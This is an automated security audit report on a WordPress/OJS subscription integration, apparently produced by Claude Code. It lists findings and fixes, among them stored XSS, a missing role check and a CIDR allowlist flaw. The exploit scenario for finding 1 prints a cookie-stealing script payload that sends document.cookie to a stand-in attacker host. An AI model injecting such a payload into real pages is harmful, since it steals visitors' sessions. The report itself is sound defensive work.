# Security Audit Report

**Date:** 2026-02-24
**Scope:** Full application — OJS plugin, WP plugin, Docker infrastructure, shell scripts
**Auditor:** Automated (Claude Code)

## Summary

| # | Finding | Severity | Component | Status |
|---|---------|----------|-----------|--------|
| 1 | Stored XSS via admin settings | HIGH | OJS plugin | Fixed |
| 2 | No explicit authorization on settings form | HIGH | OJS plugin | Fixed |
| 3 | CIDR parsing overflow | MEDIUM | OJS plugin | Fixed |
| 4 | CSRF not explicitly validated on settings form | MEDIUM | OJS plugin | Accepted (OJS framework handles) |
| 5 | Rate limit parameters leaked in error response | LOW | OJS plugin | Fixed |

## Audit categories

1. **Input validation** — SQL injection, XSS, command injection, path traversal
2. **Authentication & authorization** — API key handling, capability checks, nonces, CSRF
3. **Crypto & secrets** — key storage, generation, timing-safe comparison
4. **Data exposure** — PII in logs, admin UI, error messages
5. **Infrastructure** — port exposure, volume mounts, credential management, network isolation

---

## Findings

### 1. Stored XSS via admin settings (HIGH)

**File:** `plugins/wpojs-subscription-api/WpojsSubscriptionApiPlugin.php:296-298`

**Description:** The `loginHint`, `paywallHint`, and `footerMessage` settings are stored via `updateSetting()` with no sanitisation. These values are later injected into page HTML via `str_replace()` and `innerHTML` (login page JS injection). The locale strings say "HTML is allowed", encouraging admins to enter markup — but there's no reason these fields need arbitrary HTML.

**Exploit scenario:** An OJS journal manager (or attacker with a compromised admin session) stores `<script>document.location='https://evil.example/steal?c='+document.cookie</script>` in the login hint field. Every visitor to the OJS login page executes the script.

**Fix applied:**
- `strip_tags()` on all three values at storage time (lines 296-298)
- `htmlspecialchars()` on the full message template before placeholder substitution in all three output paths (login, paywall, footer)
- Removed "HTML is allowed" from locale string `settings.description`

### 2. No explicit authorization on settings form (HIGH)

**File:** `plugins/wpojs-subscription-api/WpojsSubscriptionApiPlugin.php:264-300`

**Description:** The `manageSettings()` method has no role check. It relies entirely on OJS routing to restrict plugin management to journal managers/site admins. However, `getRouteGroupMiddleware()` on the API controller returns `[]`, and the plugin's `manage()` method doesn't explicitly verify the caller's role either.

**Exploit scenario:** If OJS's parent `manage()` dispatcher doesn't enforce admin-only access for all verbs, any authenticated OJS user could POST to the settings endpoint and change UI messages displayed to all visitors.

**Fix applied:** Added explicit role check at the top of `manage()` — protects both `settings` and `status` verbs with a single check. Uses an OJS 3.5-compatible DB query (joins `user_user_groups` with `user_groups` to check `role_id`) instead of `$user->getRoles()`, which does not exist in OJS 3.5. Site admin check doesn't filter on `context_id` since site admins have `context_id = 0`; journal managers must match the current journal's `context_id`. Returns 403 if not authorized.

### 3. CIDR parsing overflow (MEDIUM)

**File:** `plugins/wpojs-subscription-api/WpojsApiController.php:99-109`

**Description:** The `$bits` value from CIDR notation (e.g. `192.168.0.0/33`) is cast to int without range validation. Values outside 0-32 cause undefined bitwise shift behaviour (`-1 << (32 - 33)` = `-1 << -1`), which could silently fail the IP check and allow or block unintended IPs.

**Exploit scenario:** A misconfigured `allowed_ips` entry like `10.0.0.0/0` or `10.0.0.0/33` could inadvertently allow all IPs or none, bypassing the allowlist.

**Fix applied:** Added `if ($bits < 0 || $bits > 32) { continue; }` after parsing the CIDR entry. Invalid entries are skipped with no match.

### 4. CSRF not explicitly validated on settings form (MEDIUM)

**File:** `plugins/wpojs-subscription-api/templates/settings.tpl:58-75`

**Description:** The settings form submits via `fetch()` with `X-Requested-With: XMLHttpRequest` but no explicit CSRF token. This relies on OJS's middleware to enforce CSRF protection on `manage()` POST requests.

**Assessment:** OJS 3.5's `GenericPlugin::manage()` is routed through the OJS page handler which enforces CSRF via session-based tokens on POST requests. The `X-Requested-With` header provides additional protection against cross-origin requests (browsers won't send this header cross-origin without CORS preflight). This is **accepted risk** — the framework provides CSRF protection at the routing layer.

**Recommendation:** If moving to a custom API route in future, add explicit `{csrf}` token to the form.

### 5. Rate limit parameters leaked in error response (LOW)

**File:** `plugins/wpojs-subscription-api/WpojsApiController.php:211-215`

**Description:** The 429 error message includes exact rate limit parameters: `"Rate limit exceeded (300 requests per 60s)"`. This gives attackers precise calibration data to time their requests just below the limit.

**Fix applied:** Changed to generic message: `"Rate limit exceeded. Please retry later."`

---

## Clean areas

### WP plugin (`plugins/wpojs-sync/`)

The WordPress plugin follows security best practices throughout. No findings.

- **Authorization:** All admin pages check `current_user_can('manage_options')` before rendering or processing. All forms use WordPress nonce verification (`wp_verify_nonce()` / `check_admin_referer()`).
- **SQL injection:** All database queries use `$wpdb->prepare()` with typed placeholders. No raw SQL concatenation.
- **XSS:** All HTML output uses `esc_html()`, `esc_attr()`, `esc_url()` as appropriate. No raw `echo` of user-controlled data.
- **Settings:** All settings registered with sanitisation callbacks (`absint`, `sanitize_text_field`, custom validators).
- **API key:** Stored as `wp-config.php` constant (`WPOJS_API_KEY`), never displayed in admin UI, sent only as `Authorization: Bearer` header over HTTPS.
- **No dangerous functions:** No `eval()`, `exec()`, `system()`, `passthru()`, `unserialize()` on user input, or `innerHTML` injection.

### OJS API controller (`WpojsApiController.php`)

Mostly clean. The controller implements defence-in-depth well:

- **Auth:** Every protected endpoint calls `checkAuth()` which enforces IP allowlist + API key + rate limit.
- **API key comparison:** Uses `hash_equals()` for timing-safe comparison.
- **IP source:** Uses `REMOTE_ADDR` directly, not `X-Forwarded-For` (avoids spoofing).
- **Input validation:** Email validated with `filter_var(FILTER_VALIDATE_EMAIL)`, IDs validated as positive integers, dates validated with `DateTime::createFromFormat()`.
- **Error messages:** Generic ("User not found", "Failed to create user") — no stack traces or internal details leaked.

### Docker/infrastructure

No findings. Development-appropriate security posture.

- **Credentials:** Dev credentials in docker-compose.yml; staging/prod examples use `openssl rand` generation instructions. `.env` files gitignored.
- **Database ports:** Not exposed on host — only accessible within Docker network.
- **Config volumes:** Mounted read-only where appropriate.
- **Secret scanner:** Pre-commit hook via `scripts/lib/check-secrets.sh` catches common secret patterns.
- **Entrypoint:** Generates `OJS_APP_KEY` with `openssl rand -base64 32` (crypto-random).
- **Apache:** `CGIPassAuth on` correctly configured for Authorization header passthrough through PHP-FPM.
